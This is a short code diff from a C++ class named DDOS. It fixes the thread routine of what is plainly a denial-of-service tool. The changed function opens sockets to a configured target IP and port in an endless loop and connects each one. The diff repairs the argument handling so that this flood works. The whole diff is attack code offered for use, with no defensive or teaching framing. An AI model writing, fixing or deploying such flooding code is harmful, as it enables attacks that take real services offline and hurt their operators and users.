@@ -21,14 +21,15 @@ bool DDOS::getProtocol() {
   return this->protocol;
 }
 
-void* DDOS::goSocket(void *) {
+void* DDOS::goSocket(void *object) {
+  DDOS *mockingSocket = (DDOS *) object;
   while (true) {
     SOCKADDR_IN sin;
-    SOCKET sock = socket(AF_INET, object.protocol, 0);
+    SOCKET sock = socket(AF_INET, mockingSocket->protocol, 0);
     // TODO: Check socket && return error bootstrap.
-    sin.sin_addr.s_addr = inet_addr(object.target);
+    sin.sin_addr.s_addr = inet_addr(mockingSocket->target);
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(object.port);
+    sin.sin_port = htons(mockingSocket->port);
     connect(sock, (SOCKADDR*)&sin, sizeof(sin));
     // TODO: Check connect && return error bootstrap..
   }
